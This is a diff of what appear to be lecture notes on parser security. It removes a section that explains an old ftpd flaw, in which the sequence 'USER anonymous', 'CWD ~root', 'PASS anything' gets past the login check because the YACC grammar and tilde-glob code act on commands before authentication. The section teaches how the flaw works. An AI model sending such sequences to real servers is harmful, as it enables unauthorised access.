@@ -53,45 +53,6 @@ cmd : USER SP username CRLF
 ```
 > Problem: the concept is good, but the code was buggy.
 
-### FTP Attack
-Consider the following command sequence:
-```
-USER anonymous # set anonlymous login flag, retrieve anonymous entry from /etc/passwd
-CWD ˜root
-PASS anything
-```
-The trick: the `legal sequence` is:
-```
-USER
-PASS
-session commands
-```
-`ftpd` grammar treats all commands the same, including `USER` and `PASS`.
-
-A closer look at the Actual YACC Grammar:
-```
-cmd : USER SP username CRLF
-| PASS SP password CRLF
-| CWD check_login SP pathname CRLF # pseudo-rule, just a hook for some C code that checks the logged in flag
-| ...
-```
-How to find pathname?
-```
-pathname : STRING
-= {
-if ($1 && strncmp((char *) $1, "˜", 1) == 0) {
-    $$ = (int)*glob((char *) $1);
-    if (globerr != NULL) {
-        reply(550, globerr);
-        $$ = NULL;
-    }
-    free((char *) $1);
-} else
-    $$ = $1;
-}
-;
-```
-
 
 
 
